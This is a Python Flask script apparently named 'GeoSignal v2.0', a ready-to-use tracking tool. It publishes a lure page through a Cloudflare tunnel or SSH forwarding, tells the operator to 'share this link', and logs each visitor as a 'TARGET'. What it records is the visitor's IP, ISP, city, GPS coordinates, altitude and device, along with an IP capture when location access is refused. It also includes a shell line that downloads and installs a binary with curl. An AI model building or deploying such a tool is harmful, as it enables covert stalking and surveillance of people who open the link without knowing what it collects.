import os
import datetime
import requests
import subprocess
import threading
import time
import socket
from flask import Flask, render_template, request
from colorama import Fore, Style, init

init(autoreset=True)
app = Flask(__name__)
cloudflared_url = None

def banner():
    os.system('clear')
    print(f"{Fore.BLUE}{Style.BRIGHT}")
    print("  ██████╗ ███████╗ ██████╗ ███████╗██╗ ██████╗ ███╗   ██╗ █████╗ ██╗     ")
    print(" ██╔════╝ ██╔════╝██╔═══██╗██╔════╝██║██╔════╝ ████╗  ██║██╔══██╗██║     ")
    print(" ██║  ███╗█████╗  ██║   ██║███████╗██║██║  ███╗██╔██╗ ██║███████║██║     ")
    print(" ██║   ██║██╔══╝  ██║   ██║╚════██║██║██║   ██║██║╚██╗██║██╔══██║██║     ")
    print(" ╚██████╔╝███████╗╚██████╔╝███████║██║╚██████╔╝██║ ╚████║██║  ██║███████╗")
    print("  ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝")
    print(f"{Fore.GREEN}{Style.BRIGHT}{' '*52}v 2.0{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}{' '*45}Made by Hexa Ton")
    print(f"{Fore.BLUE}{'━'*75}{Style.RESET_ALL}")

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
        if ip: return ip
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr or 'Unknown'

def get_ip_info(ip):
    try:
        r = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        if r.status_code == 200:
            data = r.json()
            return {
                'city': data.get('city', 'N/A'),
                'region': data.get('region', 'N/A'),
                'country': data.get('country_name', 'N/A'),
                'isp': data.get('org', 'N/A'),
                'timezone': data.get('timezone', 'N/A')
            }
    except: pass
    return {'city': 'N/A', 'region': 'N/A', 'country': 'N/A', 'isp': 'N/A', 'timezone': 'N/A'}

def show_capture(lat, lon, acc, alt, dev, ua, ip_addr, ip_info):
    time_now = datetime.datetime.now().strftime("%I:%M:%S %p")
    
    print(f"\n{Fore.RED}{Style.BRIGHT}  ████████████████████████████████████████████████████████████")
    print(f"{Fore.RED}{Style.BRIGHT}  █                                                          █")
    print(f"{Fore.RED}{Style.BRIGHT}  █        [!!!] TARGET SUCCESSFULLY IDENTIFIED [!!!]        █")
    print(f"{Fore.RED}{Style.BRIGHT}  █                                                          █")
    print(f"{Fore.RED}{Style.BRIGHT}  ████████████████████████████████████████████████████████████")
    
    print(f"\n{Fore.CYAN}{Style.BRIGHT}  ╔══════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}{Style.BRIGHT}  ║               🌐 TARGET IP & NETWORK INFO                 ║")
    print(f"{Fore.CYAN}{Style.BRIGHT}  ╠══════════════════════════════════════════════════════════╣")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🌍 IP Address : {Fore.GREEN}{Style.BRIGHT}{ip_addr:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🏙️ City       : {Fore.YELLOW}{ip_info['city']:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🗺️ Region     : {Fore.YELLOW}{ip_info['region']:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🌍 Country    : {Fore.YELLOW}{ip_info['country']:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🏢 ISP        : {Fore.YELLOW}{ip_info['isp']:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🕐 Timezone   : {Fore.YELLOW}{ip_info['timezone']:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}{Style.BRIGHT}  ╚══════════════════════════════════════════════════════════╝")
    
    print(f"\n{Fore.CYAN}{Style.BRIGHT}  ╔══════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}{Style.BRIGHT}  ║               🛰️  ADVANCED GEOLOCATION DATA               ║")
    print(f"{Fore.CYAN}{Style.BRIGHT}  ╠══════════════════════════════════════════════════════════╣")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}📌 Latitude  : {Fore.YELLOW}{lat:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}📍 Longitude : {Fore.YELLOW}{lon:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}📏 Accuracy  : {Fore.YELLOW}{acc:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}⛰️ Altitude  : {Fore.YELLOW}{alt:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🕒 Trace Time: {Fore.GREEN}{time_now:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}{Style.BRIGHT}  ╚══════════════════════════════════════════════════════════╝")

    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}  ╔══════════════════════════════════════════════════════════╗")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}  ║                📱 TARGET DEVICE SIGNATURE                ║")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}  ╠══════════════════════════════════════════════════════════╣")
    print(f"{Fore.MAGENTA}  ║  {Fore.WHITE}📱 Device    : {Fore.YELLOW}{dev:<35}    {Fore.MAGENTA}║")
    print(f"{Fore.MAGENTA}  ║  {Fore.WHITE}🔗 OS        : {Fore.YELLOW}{detect_os(ua):<35}    {Fore.MAGENTA}║")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}  ╚══════════════════════════════════════════════════════════╝")

    maps_url = f"https://www.google.com/maps?q={lat},{lon}"
    print(f"\n{Fore.GREEN}{Style.BRIGHT}  ╔══════════════════════════════════════════════════════════╗")
    print(f"{Fore.GREEN}{Style.BRIGHT}  ║               📍 INTERACTIVE MAPS OVERLAY                ║")
    print(f"{Fore.GREEN}{Style.BRIGHT}  ╠══════════════════════════════════════════════════════════╣")
    print(f"{Fore.GREEN}  ║ {Fore.BLUE}{Style.BRIGHT}{maps_url:<53} {Fore.GREEN}║")
    print(f"{Fore.GREEN}{Style.BRIGHT}  ╚══════════════════════════════════════════════════════════╝\n")

def detect_os(ua):
    if not ua: return 'Unknown'
    if 'iPhone' in ua or 'iPad' in ua: return 'iOS'
    if 'Android' in ua: return 'Android'
    if 'Windows' in ua: return 'Windows'
    if 'Mac' in ua: return 'macOS'
    if 'Linux' in ua: return 'Linux'
    return 'Other'

def start_cloudflared():
    global cloudflared_url
    try:
        result = subprocess.run(['which', 'cloudflared'], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"{Fore.YELLOW}[!] Cloudflared not found. Installing...{Style.RESET_ALL}")
            os.system('pkg install cloudflared -y 2>/dev/null || apt install cloudflared -y 2>/dev/null || (curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -o cloudflared && chmod +x cloudflared && mv cloudflared $PREFIX/bin/) 2>/dev/null')
        print(f"{Fore.CYAN}[*] Starting Cloudflared tunnel...{Style.RESET_ALL}")
        process = subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://localhost:8080'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        timeout = 15
        start_time = time.time()
        while time.time() - start_time < timeout:
            line = process.stderr.readline()
            if line:
                if 'https://' in line and '.trycloudflare.com' in line:
                    for word in line.split():
                        if word.startswith('https://') and '.trycloudflare.com' in word:
                            cloudflared_url = word.strip()
                            print(f"\n{Fore.GREEN}{Style.BRIGHT}╔══════════════════════════════════════════════════════════╗")
                            print(f"{Fore.GREEN}{Style.BRIGHT}║         🌐 CLOUDFLARED TUNNEL ACTIVE                     ║")
                            print(f"{Fore.GREEN}{Style.BRIGHT}╠══════════════════════════════════════════════════════════╣")
                            print(f"{Fore.GREEN}║  {Fore.RED}{Style.BRIGHT}{cloudflared_url:<53} {Fore.GREEN}║")
                            print(f"{Fore.GREEN}{Style.BRIGHT}╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
                            return cloudflared_url
            time.sleep(0.1)
        print(f"{Fore.RED}[!] Cloudflared timeout.{Style.RESET_ALL}")
        return None
    except Exception as e:
        print(f"{Fore.RED}[!] Cloudflared error: {e}{Style.RESET_ALL}")
        return None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log():
    lat = request.form.get('lat', '0')
    lon = request.form.get('lon', '0')
    acc = request.form.get('acc', 'N/A')
    alt = request.form.get('alt', 'N/A')
    dev = request.form.get('dev', 'N/A')
    ua = request.headers.get('User-Agent')
    ip_addr = get_client_ip()
    ip_info = get_ip_info(ip_addr)
    show_capture(lat, lon, acc, alt, dev, ua, ip_addr, ip_info)
    return "OK"

@app.route('/track', methods=['POST'])
def track():
    ua = request.headers.get('User-Agent')
    ip_addr = get_client_ip()
    ip_info = get_ip_info(ip_addr)
    time_now = datetime.datetime.now().strftime("%I:%M:%S %p")
    print(f"\n{Fore.RED}{Style.BRIGHT}  ████████████████████████████████████████████████████████████")
    print(f"{Fore.RED}{Style.BRIGHT}  █                                                          █")
    print(f"{Fore.RED}{Style.BRIGHT}  █        [!!!] IP CAPTURED - NO LOCATION ACCESS [!!!]       █")
    print(f"{Fore.RED}{Style.BRIGHT}  █                                                          █")
    print(f"{Fore.RED}{Style.BRIGHT}  ████████████████████████████████████████████████████████████")
    print(f"\n{Fore.CYAN}{Style.BRIGHT}  ╔══════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}{Style.BRIGHT}  ║               🌐 TARGET IP & NETWORK INFO                 ║")
    print(f"{Fore.CYAN}{Style.BRIGHT}  ╠══════════════════════════════════════════════════════════╣")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🌍 IP Address : {Fore.GREEN}{Style.BRIGHT}{ip_addr:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🏙️ City       : {Fore.YELLOW}{ip_info['city']:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🗺️ Region     : {Fore.YELLOW}{ip_info['region']:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🌍 Country    : {Fore.YELLOW}{ip_info['country']:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🏢 ISP        : {Fore.YELLOW}{ip_info['isp']:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🕐 Timezone   : {Fore.YELLOW}{ip_info['timezone']:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}🕒 Trace Time : {Fore.GREEN}{time_now:<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}  ║  {Fore.WHITE}📱 OS         : {Fore.YELLOW}{detect_os(ua):<35}    {Fore.CYAN}║")
    print(f"{Fore.CYAN}{Style.BRIGHT}  ║  {Fore.RED}⚠️  LOCATION ACCESS DENIED BY TARGET             {Fore.CYAN}║")
    print(f"{Fore.CYAN}{Style.BRIGHT}  ╚══════════════════════════════════════════════════════════╝\n")
    return "OK"

def run_server():
    app.run(host='0.0.0.0', port=8080)

if __name__ == '__main__':
    banner()
    print(f"{Fore.WHITE}[01] Localhost (Testing)")
    print(f"{Fore.WHITE}[02] Cloudflared (Public URL)")
    print(f"{Fore.WHITE}[03] SSH (Manual Forwarding)")
    choice = input(f"\n{Fore.CYAN}GeoSignal > {Style.RESET_ALL}")
    import logging
    log_flask = logging.getLogger('werkzeug')
    log_flask.setLevel(logging.ERROR)
    if choice in ['1', '01']:
        banner()
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}+ Server Running Successfully{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[*] Localhost: http://127.0.0.1:8080")
        run_server()
    elif choice in ['2', '02']:
        banner()
        print(f"\n{Fore.CYAN}[*] Starting local server...{Style.RESET_ALL}")
        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()
        time.sleep(2)
        cf_url = start_cloudflared()
        if cf_url:
            print(f"\n{Fore.YELLOW}{Style.BRIGHT}[!] Share this link:{Style.RESET_ALL}")
            print(f"{Fore.RED}{Style.BRIGHT}{cf_url}{Style.RESET_ALL}")
            print(f"\n{Fore.WHITE}[*] Press Ctrl+C to stop{Style.RESET_ALL}")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Shutting down...{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Failed.{Style.RESET_ALL}")
    elif choice in ['3', '03']:
        banner()
        print(f"{Fore.YELLOW}[!] SSH: Run 'ssh -R 80:localhost:8080 nokey@localhost.run' in new session.")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}+ Server Running{Style.RESET_ALL}")
        run_server()
    else:
        print(f"{Fore.RED}[!] Invalid Choice.{Style.RESET_ALL}")
